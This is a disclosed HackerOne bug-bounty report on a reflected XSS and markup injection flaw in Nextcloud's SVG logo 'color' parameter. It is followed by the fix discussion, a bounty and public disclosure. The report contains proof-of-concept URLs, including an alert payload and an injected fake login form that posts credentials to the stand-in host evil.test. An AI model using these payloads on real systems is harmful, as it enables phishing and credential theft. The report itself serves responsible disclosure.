{"id":605915,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MDU5MTU=","url":"https://hackerone.com/reports/605915","title":"Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-06-11T12:15:58.642Z","submitted_at":"2019-06-11T12:15:58.642Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"freddyb","url":"/freddyb","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8120"],"singular_disclosure_disabled":false,"disclosed_at":"2019-08-29T20:01:03.747Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-30T20:01:03.012Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I just found a reflected Cross-Site Scripting (XSS) vulnerability in Nextcloud Server that affects current stable and dates back to at least 15.0.5.\nThe vulnerability seems mitigated by a Content-Security-Policy (CSP), but there might be a residual risk for phishing, due to the CSP's lack of a `form-action` directive.\n\nSteps to repeat (for basic XSS):\n0) Replace server.test in the following URLs with your own test instance of Nextcloud.\n1) Open Developer Tools (alternatively, disable CSP in your browser :-))\n2) go to https://server.test/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh\n3) Observe the CSP violation (alternatively, the alert popup)\n\nSteps to repeat for phishing\n0) Replace server.test in the following URLS with your own test instance of Nextcloud.\n1) Visit https://server.test/nextcloud/index.php/svg/core/logo/logo?color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22\n1a) For improved readability, here's the resulting SVG source code\n```html\n\u003csvg width=\"256\" height=\"128\" version=\"1.1\" viewBox=\"0 0 256 128\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cg fill=\"none\" stroke-width=\"22\"\u003e\u003ccircle cx=\"40\" cy=\"64\" r=\"26\" stroke=\"#fff\"/\u003e\u003cforeignObject class=\"node\" x=\"0\" y=\"0\" width=\"600\" height=\"600\"\u003e\u003cdiv xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003cp\u003eLogin\u003c/p\u003e\u003cform action=\"//evil.test\"\u003e\u003cinput placeholder=\"Username\" type=\"text\"/\u003e\u003cbr/\u003e \u003cinput placeholder=\"Password\" type=\"text\" /\u003e\u003cbr/\u003e\u003cinput type=\"submit\" value=\"Login\" /\u003e\u003c/form\u003e\u003c/div\u003e\u003c/foreignObject\u003e\u003ccircle alt=\"\" fill=\"none\"/\u003e\u003ccircle cx=\"216\" cy=\"64\" r=\"26\" stroke=\"#fff\"/\u003e\u003cforeignObject class=\"node\" x=\"0\" y=\"0\" width=\"600\" height=\"600\"\u003e\u003cdiv xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003cp\u003eLogin\u003c/p\u003e\u003cform action=\"//evil.test\"\u003e\u003cinput placeholder=\"Username\" type=\"text\"/\u003e\u003cbr/\u003e \u003cinput placeholder=\"Password\" type=\"text\" /\u003e\u003cbr/\u003e\u003cinput type=\"submit\" value=\"Login\" /\u003e\u003c/form\u003e\u003c/div\u003e\u003c/foreignObject\u003e\u003ccircle alt=\"\" fill=\"none\"/\u003e\u003ccircle cx=\"128\" cy=\"64\" r=\"46\" stroke=\"#fff\"/\u003e\u003cforeignObject class=\"node\" x=\"0\" y=\"0\" width=\"600\" height=\"600\"\u003e\u003cdiv xmlns=\"http://www.w3.org/1999/xhtml\"\u003e\u003cp\u003eLogin\u003c/p\u003e\u003cform action=\"//evil.test\"\u003e\u003cinput placeholder=\"Username\" type=\"text\"/\u003e\u003cbr/\u003e \u003cinput placeholder=\"Password\" type=\"text\" /\u003e\u003cbr/\u003e\u003cinput type=\"submit\" value=\"Login\" /\u003e\u003c/form\u003e\u003c/div\u003e\u003c/foreignObject\u003e\u003ccircle alt=\"\" fill=\"none\"/\u003e\u003c/g\u003e\u003c/svg\u003e\n\n```\n2) Observe how we injected a login form that points to https://evil.test. Note that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).\n\n## Impact\n\n- Phishing\n- XSS on the nextcloud instance, if the CSP is bypassed (rather unlikely)","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-08-29T20:01:03.263Z","allow_singular_disclosure_after":-66856314.24804365,"singular_disclosure_allowed":true,"vote_count":17,"voters":["secator","sameerphad72","cr4xerbik4sh","s3ntago","monochrome","tiago-danin","cryptographer","armansameer","homosapien","woko_collins-77","and 7 more..."],"severity":{"rating":"medium","score":6.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":13,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/server","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5048493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","automated_response":true,"created_at":"2019-06-11T12:15:58.965Z","updated_at":"2019-06-11T12:15:58.965Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5065339,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e   Note that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).\n\nI just noticed the CSP's `style-src` directive allows 'unsafe-inline', so the phishing vector could be styled arbitrarily.","automated_response":false,"created_at":"2019-06-12T12:38:47.036Z","updated_at":"2019-06-12T12:38:47.036Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5065406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I finally got the time to dig into the source code.\n\nThe injection happens in the [`colorizeSvg` function in IconsCacher.php in (line 186, permalink](https://github.com/nextcloud/server/blob/c352bb5416d28c05ca11c3a22c093b66bddc61a1/lib/private/Template/IconsCacher.php#L186)), as the color value is neither being validated nor escaped. The color comes from [SvgController.php `getSvg()` function (line 127, permalink](https://github.com/nextcloud/server/blob/6ad7f329385f73a731f69d9f00cf5b038f3eac04/core/Controller/SvgController.php#L127)).\n\nI haven't dug deep enough to see whether Nextcloud server usually escapes in the sources or in the sink, so depending on other callers of `colorizeSvg`, you might just add a regex filter that limits colors to a regular expression of `[0-9a-f]{1,6} ` at the very beginning of the function.","automated_response":false,"created_at":"2019-06-12T12:51:17.871Z","updated_at":"2019-06-12T12:51:17.871Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5146016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the long delay, we had 2 parental leave issues and another leave sadly covering all 3 of our hackerone users at the same time.\n\nI went for the IconsCacher as a fix location, we check for `[0-9a-f]{3,6}` now and fall back to black in case it doesn't match: https://github.com/nextcloud/server/pull/16021/files\n\nSince I couldn't see any impact due to CSP, I will discuss the reward with my colleagues early next week.","automated_response":false,"created_at":"2019-06-20T13:28:42.549Z","updated_at":"2019-06-20T13:28:42.549Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5146017,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-06-20T13:28:50.465Z","updated_at":"2019-06-20T13:28:50.465Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5176146,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree there's no XSS, but rather a spoofing impact. \nHowever, I'd suggest discussing a `form-action` directive in the default CSP in parallel to fixing the injection.","automated_response":false,"created_at":"2019-06-24T08:27:45.768Z","updated_at":"2019-06-24T08:27:45.768Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5263852,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @nickvergessen: I noticed you fixed this and already backported to 14,15,16 with 16.0.2 released this week.\nCan I ask you to mark this as closed and request this report to be disclosed in public?","automated_response":false,"created_at":"2019-07-06T09:34:47.856Z","updated_at":"2019-07-06T09:34:47.856Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5271602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, I wanted to do this on Thursday, I just forgot.","automated_response":false,"created_at":"2019-07-08T07:50:44.423Z","updated_at":"2019-07-08T07:50:44.423Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5271603,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.\n\nPlease let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","automated_response":false,"created_at":"2019-07-08T07:50:54.634Z","updated_at":"2019-07-08T07:50:54.634Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"freddyb","url":"/freddyb"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5271609,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-07-08T07:51:08.574Z","updated_at":"2019-07-08T07:51:08.574Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"freddyb","url":"/freddyb"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5325631,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please credit me as [Frederik Braun](https://frederik-braun.com) with the link to https://frederik-braun.com - Thank you!","automated_response":false,"created_at":"2019-07-15T18:32:07.933Z","updated_at":"2019-07-15T18:32:07.933Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5465246,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi,\n\nTthe advisory is pending internally.\nOnce published a CVE will be requested as well.\n\nRegarding the form-actions this is actually on my list already and it just moved a bit higher. So I'll look into this now.\n\nCheers,\n--Roeland","automated_response":false,"created_at":"2019-07-30T20:01:03.136Z","updated_at":"2019-07-30T20:01:03.136Z","first_to_agree":true,"actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5465607,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nSo I checked and in the upcoming release we actually set a very strict CSP for all non template responses. So it should be catched then. Never the less I will add form-action support in our CSP.\n\nCheers,\n--Roeland","automated_response":false,"created_at":"2019-07-30T21:09:08.496Z","updated_at":"2019-07-30T21:09:08.496Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5465658,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nAh no it does not... default fallback is to allow everything.\nIn any case https://github.com/nextcloud/server/pull/16618 adds it :)\n\nCheers,\n--Roeland","automated_response":false,"created_at":"2019-07-30T21:21:22.708Z","updated_at":"2019-07-30T21:21:22.708Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5693652,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-08-29T20:01:03.776Z","updated_at":"2019-08-29T20:01:03.776Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}